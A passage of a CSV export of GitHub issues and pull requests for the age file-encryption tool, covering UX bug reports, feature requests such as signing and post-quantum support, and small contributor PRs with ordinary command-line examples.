Enter passphrase:
Error: empty scrypt password
[ Did age not do what you expected? Could an error be more useful? Tell us: https://filippo.io/age/report ]
```

There is no more autogenerated password?",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/78/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/78/comments,https://api.github.com/repos/FiloSottile/age/issues/78/events,https://github.com/FiloSottile/age/issues/78,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/77,544681382,MDU6SXNzdWU1NDQ2ODEzODI=,77,UX: Consistent capitalisation on public/private keys,8352292,closed,TRUE,NA,NA,3,2020-01-02T17:57:53Z,2021-04-19T01:42:18Z,2021-04-19T01:42:18Z,NONE,NA,"## What were you trying to do

I generated a new public/private key.

## What happened

Keys are generated, but the public key have all lower case letters, whilst the private key have all capitalised. Can they both be set to be capitalised—or lowercased, it doesn't matter, I am looking for consistency.",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/77/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/77/comments,https://api.github.com/repos/FiloSottile/age/issues/77/events,https://github.com/FiloSottile/age/issues/77,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/76,544468136,MDExOlB1bGxSZXF1ZXN0MzU4NTY5NzE5,76,README: add Arch Linux AUR instructions.,481987,closed,FALSE,NA,NA,3,2020-01-02T07:03:07Z,2020-01-10T21:27:01Z,2020-01-10T21:27:01Z,CONTRIBUTOR,NA,Update readme with Arch Linux AUR instructions.,NA,TRUE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/76/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/76/comments,https://api.github.com/repos/FiloSottile/age/issues/76/events,https://github.com/FiloSottile/age/pull/76,https://api.github.com/repos/FiloSottile/age/pulls/76
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/75,544403429,MDU6SXNzdWU1NDQ0MDM0Mjk=,75,umask in warning message is confusing,4993799,closed,FALSE,NA,6688826,9,2020-01-01T22:02:13Z,2021-04-22T17:50:09Z,2021-01-03T14:10:27Z,NONE,NA,"https://github.com/FiloSottile/age/blob/e43cf8b4a2d571df8dcb30783a460acbf188adb4/cmd/age-keygen/keygen.go#L41-L42

`066` sets the file to writable by group and everyone but not the user. I think it's meant to be `0660`.",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/75/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/75/comments,https://api.github.com/repos/FiloSottile/age/issues/75/events,https://github.com/FiloSottile/age/issues/75,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/74,544402038,MDU6SXNzdWU1NDQ0MDIwMzg=,74,UX: Show usage on naked command,22383546,closed,FALSE,NA,6688826,2,2020-01-01T21:45:25Z,2021-04-22T17:50:03Z,2021-01-03T14:10:27Z,NONE,NA,"<!-- Did age not do what you expected?
Was it hard to figure out how to do something?
Could an error message be more helpful?
It's not you, it's us. We want to hear about it. -->

## What were you trying to do

Show the usage documentation.

## What happened

```
$ age
Error: missing recipients.
Did you forget to specify -r/--recipient or -p/--passphrase?
[ Did age not do what you expected? Could an error be more useful? Tell us: https://filippo.io/age/report ]
```

## Additional detail

Right after installing age, most people are going want to see the usage output. It makes for a better user experience if you show the usage / help for all things that the user might try, instead of making the user try multiple different flags to get the usage to appear.

I'd suggest displaying the usage output when age is run with any of the following arguments:

- `age`
- `age help`
- `age --help`
- `age -h`",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/74/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/74/comments,https://api.github.com/repos/FiloSottile/age/issues/74/events,https://github.com/FiloSottile/age/issues/74,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/66,544384208,MDU6SXNzdWU1NDQzODQyMDg=,66,UX: encrypting to multiple recipients in a file,8997731,closed,FALSE,NA,6688826,0,2020-01-01T18:16:14Z,2021-04-22T17:50:20Z,2021-01-03T14:10:24Z,NONE,NA,"## What were you trying to do

Encrypt to multiple recipients in a file called `age1aaaa`:

```
$ age -a -r age1aaaa`
```

## What happened

```
Error: unknown recipient type: ""age1aaaa""
```

I suspect that this feature is not implemented yet. But anyway, how does age is supposed to know if -r is a path or a Bech32 identity? Should it try to open that file or print a warning?",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/66/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/66/comments,https://api.github.com/repos/FiloSottile/age/issues/66/events,https://github.com/FiloSottile/age/issues/66,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/65,544240996,MDU6SXNzdWU1NDQyNDA5OTY=,65,Doc: Add example of using age with minisign/signify,175539,closed,TRUE,NA,NA,1,2019-12-31T17:58:05Z,2021-04-19T03:25:05Z,2021-04-19T03:25:04Z,NONE,NA,There have been several requests for signing support. Perhaps an example in the readme showing how to use age in conjunction with a third-party signing tool like minisign would help?,NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/65/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/65/comments,https://api.github.com/repos/FiloSottile/age/issues/65/events,https://github.com/FiloSottile/age/issues/65,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/64,544217415,MDExOlB1bGxSZXF1ZXN0MzU4MzgwNDkx,64,Add support for GitHub recipient,2312453,closed,FALSE,NA,NA,3,2019-12-31T15:49:37Z,2021-01-03T14:10:25Z,2021-01-03T14:10:25Z,NONE,NA,This PR adds support to fetch user public keys directly from Github API.  (edit: seems to be duplicate of #43),NA,TRUE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/64/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/64/comments,https://api.github.com/repos/FiloSottile/age/issues/64/events,https://github.com/FiloSottile/age/pull/64,https://api.github.com/repos/FiloSottile/age/pulls/64
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/63,544208133,MDU6SXNzdWU1NDQyMDgxMzM=,63,Expose Go library functions (please review the API!),6550035,closed,FALSE,NA,NA,26,2019-12-31T15:03:14Z,2021-01-02T23:15:04Z,2021-01-02T23:15:03Z,NONE,NA,"## What were you trying to do

Use age encryption in a Go program by importing it.

## What happened

Because `age` uses `internal` it [prevents importing](https://golang.org/doc/go1.4#internalpackages). I suspect this was on purpose, and that's okay, but just wanted to check if this was sought a possibility for this spec.",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/63/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/63/comments,https://api.github.com/repos/FiloSottile/age/issues/63/events,https://github.com/FiloSottile/age/issues/63,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/62,544180423,MDU6SXNzdWU1NDQxODA0MjM=,62,Empty password,16257425,closed,FALSE,NA,NA,2,2019-12-31T12:41:02Z,2019-12-31T13:20:46Z,2019-12-31T13:20:46Z,NONE,NA,"UX appear to be complex for non-technical user, could return `Sorry, you have enter incorrect passphrase` regardless of empty or wrong passphrase.

```
 age -d README.md.age 
Enter passphrase: 
Error: empty scrypt password
[ Did age not do what you expected? Could an error be more useful? Tell us: https://filippo.io/age/report ]
```",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/62/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/62/comments,https://api.github.com/repos/FiloSottile/age/issues/62/events,https://github.com/FiloSottile/age/issues/62,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/61,544074822,MDU6SXNzdWU1NDQwNzQ4MjI=,61,UX: RECIPIENT,16257425,closed,FALSE,NA,NA,2,2019-12-31T03:15:25Z,2020-01-01T01:38:15Z,2020-01-01T01:38:15Z,NONE,NA,"## What were you trying to do
Tried to understand the purpose of RECIPIENT

What will it happen if someone tried to brute force with RECIPIENT key, are the mechanism to avoid encrypted files in form of binary or plaintext from being decrypt?
",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/61/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/61/comments,https://api.github.com/repos/FiloSottile/age/issues/61/events,https://github.com/FiloSottile/age/issues/61,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/60,543983648,MDExOlB1bGxSZXF1ZXN0MzU4MTkzODQ0,60,update homebrew formula to point to beta2,39916,closed,FALSE,NA,NA,0,2019-12-30T19:18:01Z,2019-12-30T23:14:02Z,2019-12-30T23:14:02Z,CONTRIBUTOR,NA,,NA,TRUE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/60/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/60/comments,https://api.github.com/repos/FiloSottile/age/issues/60/events,https://github.com/FiloSottile/age/pull/60,https://api.github.com/repos/FiloSottile/age/pulls/60
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/59,543978723,MDU6SXNzdWU1NDM5Nzg3MjM=,59,Feature request: Support public key authenticated encryption,7197505,closed,TRUE,NA,NA,5,2019-12-30T18:58:50Z,2021-04-19T01:08:25Z,2021-04-19T01:08:24Z,NONE,NA,"Currently age encryption with X25519 or ssh keys is unauthenticated. While the use of an AEAD for encryption of the file contents prevents tampering with the ciphertext, an attacker who is in a position to do such tampering can instead just replace the entire file with their own encrypted contents. 

Although this doesn’t impact the confidentiality of age-encrypted files, it has practical impacts on the security of streaming use-cases for which an online AE mode was (I think) selected. For example, in [agl’s blog post](https://www.imperialviolet.org/2014/06/27/streamingencryption.html) linked from the spec he talks about cases such as:
```
gpg -d your_archive.tgz.gpg | tar xz
```
This is insecure if an attacker could replace the archive with one of their choosing. Such an attack is possible in most situations a chosen ciphertext attack is. 

While you could argue that origin authentication can be done by another tool like minisign or signify, use of those tools implies giving up on streaming as a signature over the entire archive would need to be verified before any output can be processed. 

Public key authenticated encryption could be achieved by making the encryptor supply a X25519 private key and using crypto_box (or equivalent) to encrypt the file key in the header rather than the current ECIES-like scheme. 

(NB where there are multiple recipients then each recipient can use the decrypted file key to create new encrypted file contents with the same header and make it look as if the original user produced the new ciphertext, so the threat model would need to be worked out in detail - perhaps only supporting a single recipient when using this mode). 

I wrote a bit more about this here: https://neilmadden.blog/2019/12/30/a-few-comments-on-age/",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/59/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/59/comments,https://api.github.com/repos/FiloSottile/age/issues/59/events,https://github.com/FiloSottile/age/issues/59,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/58,543959533,MDExOlB1bGxSZXF1ZXN0MzU4MTc1Mjc2,58,.cirrus.yml: enable Cirrus-CI for FreeBSD CI,1034582,closed,FALSE,NA,NA,1,2019-12-30T17:50:04Z,2019-12-30T23:23:40Z,2019-12-30T23:23:35Z,CONTRIBUTOR,NA,"Example run: https://cirrus-ci.com/build/5764596254375936
",NA,TRUE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/58/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/58/comments,https://api.github.com/repos/FiloSottile/age/issues/58/events,https://github.com/FiloSottile/age/pull/58,https://api.github.com/repos/FiloSottile/age/pulls/58
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/57,543654103,MDU6SXNzdWU1NDM2NTQxMDM=,57,Output files are created even if encryption/decryption failed,6932414,closed,FALSE,NA,6688826,0,2019-12-30T01:04:44Z,2021-04-22T17:50:00Z,2021-01-03T14:10:28Z,NONE,NA,"## Environment

* OS: Arch Linux 5.4.6-arch3-1 #1 SMP PREEMPT Tue, 24 Dec 2019 04:36:53 +0000 x86_64
* age version*: 1.0.0beta2-1

## What were you trying to do
Decrypt a file without providing the `-i` argument and subsequently fix the mistake.

## What happened
The first decryption attempt already created an empty output file, and a next invocation with fixed argument refused to overwrite it.

```bash
$ echo 'Hello age' | age -a -r 'age1fh296r26vut9rpdarl89765z5qh9pavgmlam3w9s69uh5t82darqat8yat' -o encrypted.age.ascii
$ age -d -o decrypted.txt encrypted.age.ascii
Error: no identity matched a recipient
[ Did age not do what you expected? Could an error be more useful? Tell us: https://filippo.io/age/report ]
# fix the mistake
$ age -d -o decrypted.txt -i key.txt encrypted.age.ascii 
Error: failed to open output file ""decrypted.txt"": open decrypted.txt: file exists
[ Did age not do what you expected? Could an error be more useful? Tell us: https://filippo.io/age/report ]
$ ls -lh
total 8.0K
-rw-r--r-- 1 wojciech wojciech   0 Dec 30 01:52 decrypted.txt
```
### Encryption
Creation of empty files is observed also when encrypting, when given incorrect `-r` argument:

```bash
$ echo 'Hello age' | age -a -o encrypted -r BAD
Error: unknown recipient type: ""BAD""
$ ls -l encrypted
-rw-r--r-- 1 wojciech wojciech 0 Dec 30 02:02 encrypted
```

## UX side
Apart from the incorrect, I assume, behaviour of creating empty files, I am not a fan of the no-overwrite policy. I think it would be better to match most unix tools' behaviour of overwriting by default or add an `-f/--force` flag.

\* would be nice to have `age --version` to properly check that",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/57/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/57/comments,https://api.github.com/repos/FiloSottile/age/issues/57/events,https://github.com/FiloSottile/age/issues/57,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/56,543648954,MDU6SXNzdWU1NDM2NDg5NTQ=,56,Inspect encrypted file details,6932414,open,FALSE,NA,NA,2,2019-12-30T00:49:32Z,2021-04-19T04:29:46Z,NA,NONE,NA,"<!-- Did age not do what you expected?
Was it hard to figure out how to do something?
Could an error message be more helpful?
It's not you, it's us. We want to hear about it. -->

## What were you trying to do
Identify file's recipients, or at least how many recipients there are.

## What happened
I created an ascii armored encrypted file. `age` gives no way to list its recipients, as it does in the binary format (excluding some bash magic relying on the knowledge that the PEM uses base64).
 
``` 
$ age-keygen -o key.txt
Public key: age13u320nw4pv6pv7qrve2epr4r7233ms2x68r3y3tt653nyvg5y3jst3apxw
[0]$ echo 'Hello age' | age -a -r 'age13u320nw4pv6pv7qrve2epr4r7233ms2x68r3y3tt653nyvg5y3jst3apxw' -o encrypted.age.ascii
[0]$ cat encrypted.age.ascii
-----BEGIN AGE ENCRYPTED FILE-----
YWdlLWVuY3J5cHRpb24ub3JnL3YxCi0+IFgyNTUxOSAyUElIMVBpZThuVkh0WDVZ
TUwrSmxuNk1xZFI1dHliNy9Nd0ptZ0UrOVUwCi8wRzc0djRwemZHanJGTGhNb0pB
M0NQTzFQUzFzNEtpclIxeTh2ZkFwR0kKLS0tIFMxUjdZczEyVzZBczNvTGJmZ1VN
Z1hoMWxVOHEwcm40TnZ1VWcvRGM4R0kKQASOAFMfE0DMdj++onPwdeByjMGRP6Sj
3PbGzfjpktCw9HJ14r+qX9B/
-----END AGE ENCRYPTED FILE-----
[0]$ tail -n +2 encrypted.age.ascii | base64 -d
age-encryption.org/v1
-> X25519 2PIH1Pie8nVHtX5YML+Jln6MqdR5tyb7/MwJmgE+9U0
/0G74v4pzfGjrFLhMoJA3CPO1PS1s4KirR1y8vfApGI
--- S1R7Ys12W6As3oLbfgUMgXh1lU8q0rn4NvuUg/Dc8GI
@�S@�v?��s�u�r���?���������а�ru⿪_�base64: invalid input
```
As a matter of fact, a pretty listing of recipients would also be useful for non-armored files, if it could present the files in the same format as originially (e.g. to visually match/grep ssh pubkey to one of the files in ~/.ssh/id_rsa). And be a good follow up for the error message ""Error: no identity matched a recipient"". 

#### Side note - confusing feature set of beta
By browsing this repo's issues, the mailing list and the age specification, I encountered various potential methods of storing the keys and specifying recipients (the `~/.config/age/keys.txt` path, recipient's github username, providing https url of the keys). None of them seemed to work. It would be nice for the repo's readme to be more explicit about which parts are NOT implemented in the current version.",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/56/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/56/comments,https://api.github.com/repos/FiloSottile/age/issues/56/events,https://github.com/FiloSottile/age/issues/56,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/55,543572061,MDU6SXNzdWU1NDM1NzIwNjE=,55,Feature request: Post quantum crypto,59319483,closed,TRUE,NA,NA,2,2019-12-29T21:14:05Z,2021-04-19T01:09:51Z,2021-04-19T01:09:50Z,NONE,NA,"Given that age aims to be the encryption tool for the future, it should include (asymmetric) crypto that will survive the expected arrival of quantum computers.

openssh already has this implemented:
> ... based on a combination of Streamlined NTRU Prime 4591^761 and X25519.
https://www.openssh.com/releasenotes.html

Alternatively the NIST Competition for post-quantum crypto is getting to the final round in summer 2020
https://en.wikipedia.org/wiki/Post-Quantum_Cryptography_Standardization
",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/55/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/55/comments,https://api.github.com/repos/FiloSottile/age/issues/55/events,https://github.com/FiloSottile/age/issues/55,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/54,543527329,MDU6SXNzdWU1NDM1MjczMjk=,54,You can't encrypt to a github account with more than 20 keys,1504626,closed,FALSE,NA,NA,1,2019-12-29T19:11:23Z,2021-04-19T01:44:07Z,2021-04-19T01:44:06Z,NONE,NA,This occurred to us while talking on the sofa with @FiloSottile at 36c3,NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/54/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/54/comments,https://api.github.com/repos/FiloSottile/age/issues/54/events,https://github.com/FiloSottile/age/issues/54,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/52,543303570,MDU6SXNzdWU1NDMzMDM1NzA=,52,UX: Program naming and potential searchability difficulty,2342884,closed,TRUE,NA,NA,1,2019-12-29T01:45:19Z,2021-04-19T01:33:33Z,2021-04-19T01:33:32Z,NONE,NA,"<!-- Did age not do what you expected?
Was it hard to figure out how to do something?
Could an error message be more helpful?
It's not you, it's us. We want to hear about it. -->

## What were you trying to do

Discover `age` as a potential tool to use having heard of it only by formal name or seen in a lightly-commented script file.

## What happened

Standalone, `age` is a simple English word and a notable substring of other words used in pack**age** man**age**rs. For example, while [Macports](https://www.macports.org/) is currently not a supported package manage for installing `age` on MacOS, the following searches show how the name is essentially useless for finding the package without necessarily an exact match:

```
$ port search --name age | grep Found
Found 313 ports.
$ port search age | grep Found
Found 2336 ports.
```

It would be fairly impractical to sort through these long lists trying to see if `age` is available without prior knowledge.

Search-confounding words include, but are not limited to: manager, management, language, package, damage, agent, image, message, usage.

Is there a way to improve the naming or searchability of the name of this utility?",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/52/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/52/comments,https://api.github.com/repos/FiloSottile/age/issues/52/events,https://github.com/FiloSottile/age/issues/52,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/51,543301931,MDU6SXNzdWU1NDMzMDE5MzE=,51,An Argument for Signing Support,160984,closed,TRUE,NA,NA,7,2019-12-29T01:21:49Z,2021-04-19T01:09:17Z,2021-04-19T01:09:14Z,NONE,NA,"According to the [specification](https://age-encryption.org/v1), signing of any type is out of scope:

> * _Any kind of signing_ (which is not a tooling problem, but a trust and key distribution problem, and to the extent that tools matter you should just use signify/minisign, and for keys we should probably use SSH ones)

This is, in my opinion, a missed opportunity. This project is an opportunity to not only build a new tool that addresses issues that plague other tools (such as GPG), but also to build support in the community around this tool. By placing this restriction on the functionality that age may contain, age is less useful, and will require the use off additional tools (and additional keys to manage) to achieve the same functionality that users will likely expect.

This expectation can be demonstrated by looking at the open issues (such as #38 & #49), and conversation on Twitter about age - the lack of signing support is striking potential users as a surprise, as it would be assumed that a tool of this nature would include signing support. There is, without question, user interest in this feature.

There are, as noted in the quoted section above, issues with signing support, in that it can involve key distribution and trust, which are complex issues - that said, these issues need not be addressed by age, as a solution is not required to allow users that wish to validate that an encrypted file is from the expected sender/system to perform this validation. Adding optional support for signing a file with the sender's key is a trivial matter; adding an additional header to the age file format is a simple matter, adding CLI support for this is likewise, a simple matter.

In use cases where it is desirable to validate the sender, it would not be unreasonable to require users to transmit their public key out-of-band (from a UX perspective, this could use the proposed `aliases.txt` file to display a friendly name for known senders). It is possible that key distribution methods could evolve around age, though these should be allowed to evolve organically, and it is not necessary for age to address this at this point in time.

While there are tools such as signify and minisign (which I am personally a fan of), it is not a good user experience to require users to make use of an additional tool, with additional keys, to perform signing of files they produce.

I would propose that an optional header be added, which includes the sender's public key and a signature of the hash of the encrypted data. When a file is decrypted, this signature would be validated, and decryption should fail if this check fails. The user can either manually review the public key for a match to known senders, or age could look up the public key in the proposed `aliases.txt` file and display a friendly name. This could be done with minimal impact, would improve protection of files that have been signed, and require no extra effort from those that don't have a need to perform this validation.

I appreciate that this could lead to a push for greater development of a key distribution & trust solution (which could evolve into a interesting side project, though that's another conversation), though it will without doubt lead to a better user experience and lead to further use cases for age.",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/51/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/51/comments,https://api.github.com/repos/FiloSottile/age/issues/51/events,https://github.com/FiloSottile/age/issues/51,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/50,543300080,MDExOlB1bGxSZXF1ZXN0MzU3NTk3MDkw,50,all: add initial goreleaser config,6942,closed,FALSE,NA,NA,1,2019-12-29T01:03:03Z,2021-01-03T14:29:55Z,2021-01-03T14:29:55Z,CONTRIBUTOR,NA,"Initial step towards #25, ready for initial review.",NA,TRUE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/50/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/50/comments,https://api.github.com/repos/FiloSottile/age/issues/50/events,https://github.com/FiloSottile/age/pull/50,https://api.github.com/repos/FiloSottile/age/pulls/50
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/49,543292285,MDU6SXNzdWU1NDMyOTIyODU=,49,Use chacha20 without poly for more speed? Aka AEAD?,720802,closed,FALSE,NA,NA,2,2019-12-28T23:23:09Z,2019-12-31T00:33:36Z,2019-12-29T14:01:49Z,NONE,NA,"According to the specification https://age-encryption.org/v1, signing is out of scope, thus authentication is out of scope, thus AEAD is a misfeature slowing decryption and bloating the file size, and worse, implies nonexistent authentication to an unattentive reader.

The specification misquotes an authenticated streaming encryption endorsement https://www.imperialviolet.org/2014/06/27/streamingencryption.html, as it doesn't actually provide any authentication in the recommended usage scheme.

Is there actually a reasonable case for encryption without authentication? Is it not a bad idea to release an encryption tool without authentication, as masses will forget to sign when they should?


On a more serious note, if we were to take recommendation from the quoted document:
https://www.imperialviolet.org/2014/06/27/streamingencryption.html, age would provide a semblance of nacl's crypto_box, with streaming, on a command line. It seems reasonable to support encryption to either a symmetric or asymmetric key and verify authenticity via a symmetric or asymmetric key. No web of trust, key distribution etc.

It might be nice if it were interoperable with signify, meaning it could use the same key, at least for signing. It might even be possible to reuse the format to sign the header and that might be sufficient.",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/49/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/49/comments,https://api.github.com/repos/FiloSottile/age/issues/49/events,https://github.com/FiloSottile/age/issues/49,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/48,543288619,MDU6SXNzdWU1NDMyODg2MTk=,48,UX: Support reading password from file(descriptor),720802,closed,TRUE,NA,NA,0,2019-12-28T22:38:37Z,2021-04-19T03:53:36Z,2021-04-19T03:53:36Z,NONE,NA,"It would be very useful, if age supported reading password from file descriptor/path.
It can be done safely, it would be useful for automation and AFAIU it is the only encryption mode that actually does authenticated encryption. 

AFAIK types of usage shown below should be safe. Both can less or more practically be read by the same user, but a more permanent private key would be even easier to read.
```
age --password-fd <( <<< ""$PASS"") ...
```

```
pwfile=$(mktemp /dev/shm/XXXXXX)
cat > ""$pwfile"" << EOF
$PASS
EOF
age --password-fd ""$pwfile"" ...
rm ""$pwfile""
```",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/48/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/48/comments,https://api.github.com/repos/FiloSottile/age/issues/48/events,https://github.com/FiloSottile/age/issues/48,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/47,543287426,MDExOlB1bGxSZXF1ZXN0MzU3NTg3ODEw,47,Add QR Code Generation to keygen,160984,closed,FALSE,NA,NA,3,2019-12-28T22:23:39Z,2019-12-30T18:16:38Z,2019-12-30T14:05:04Z,NONE,NA,"This change adds a new flag to the `keygen` command (`-q`) that produces a QR code from the public key. This is useful as it provides a simple way to transfer the public key, especially to mobile applications (which I'm interested in doing for another project I'm working on). In the case of mobile applications, this is quite a bit easier, and less error prone, than manual entry of the public key.

This uses the [go-qrcode](https://github.com/skip2/go-qrcode) package to produce the QR code and generate the string that is printed to the console. 

This does not write the QR code to a file, if the output is being written to a file (via `-o`), this will print the QR code to `os.Stderr`, matching the existing public key behavior of the `generate` method.

This produces a ""small"" QR code, or at least the smallest that can reasonably be done for console output; here is a sample of the output, with all output going to the console (`-o` not used):

```
# created: 2019-12-28T17:20:16-05:00
# public key: age1gaqle5vafy4aqcrw6pakc9c892ph3jkjd3c9cx7r24xhm27zkupq5nrehn
public key QR code:
█████████████████████████████████████████
█████████████████████████████████████████
████ ▄▄▄▄▄ █▀ █▀▀▀▀█▄▀ ▀▀ ▄█▄█ ▄▄▄▄▄ ████
████ █   █ █▀ ▄ █▀▄▀ ▀█▄  █▄ █ █   █ ████
████ █▄▄▄█ █▀█ █▄▀▀  ▀█▄██▀▄██ █▄▄▄█ ████
████▄▄▄▄▄▄▄█▄█▄█ █▄█▄█▄▀ ▀ █ █▄▄▄▄▄▄▄████
████  ▄▄▄█▄   ▄█▄█  ▄▄ █▄█  ▀▄▀▄█ ▀▄▀████
████▀█  █▀▄ ▀ ▀ ▄ ▄▄ ▄▄ ▄ ▄▀▀▀█▄█ ▀ █████
████▄ ▀▀█ ▄▄▄▄▀▄▀██ █▄ ▀▄ ▄▀▄ ▀▀▄█▀▀▀████
████ ▄▀▀▀▄▄█▀█▀█▀ ▄▄ ▄▄▀▀▀█▀▀▀█▀▀  ▀█████
████▀██▄▀█▄█ ▀▄█▄▄▄  █▀▀▄ █ ▄▄▀█▄▄▀▄▀████
████▄█ ▄▄█▄▄▀▄▄ ▄██▄  █▀▄▀ █▀▀▀▄▄   ▀████
████▀█  ▀▀▄█ ▀█▄▀▀█▄▄█ █▀ █▀▄ ▀▄▄▀█▄▀████
████ █▄█ ▄▄ ▄  █▀ ▄█▀ ▀▀▀█▄█ █▀▀█▀  █████
████▄█▄█▄█▄▄  ▄█▄█▄▄██ ▀█ █▀ ▄▄▄ ▀▀█▀████
████ ▄▄▄▄▄ █▄▄▀ ▄█▀█  ▀ ▀▀▀  █▄█ ▄  ▀████
████ █   █ █  █▄▀▀▀▄ ██▀▄▀▀█▄ ▄   ▀▀▄████
████ █▄▄▄█ █ ▄██▀ ▄▄▄▄▄ ▀█▄ ▄ ▄▀▀  ██████
████▄▄▄▄▄▄▄█▄███▄█▄▄█▄▄█████▄▄▄██▄█▄█████
█████████████████████████████████████████
▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀

AGE-SECRET-KEY-1S269XL94KFEKRJP0YX8RZTTLQU4494UF33TRZNUZ8QXYMN73WDAS8STDD8
```

If there are any questions, or any improvements needed, I would be happy to address any feedback.",NA,TRUE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/47/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/47/comments,https://api.github.com/repos/FiloSottile/age/issues/47/events,https://github.com/FiloSottile/age/pull/47,https://api.github.com/repos/FiloSottile/age/pulls/47
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/46,543275255,MDU6SXNzdWU1NDMyNzUyNTU=,46,Feature request: Support for symmetric key files,59319483,closed,FALSE,NA,NA,3,2019-12-28T20:06:33Z,2021-04-19T01:41:11Z,2021-04-19T01:41:11Z,NONE,NA,"I would like to consider the age format for some future applications, however a common requirement is the use of key files instead of passwords, especially where no user interaction is given.
The key files in these scenarios are used as symmetric keys and optionally protected by a master password. One of the application ideas is similar to a rachet with pre shared symmetric keys, where the user enters a password to access an app and decrypt the keyfiles for the session. 

Currently supported in age:
- asymmetric keys
- passwords (interactive only)

Wanted feature:
- symmetric keys",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/46/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/46/comments,https://api.github.com/repos/FiloSottile/age/issues/46/events,https://github.com/FiloSottile/age/issues/46,NA
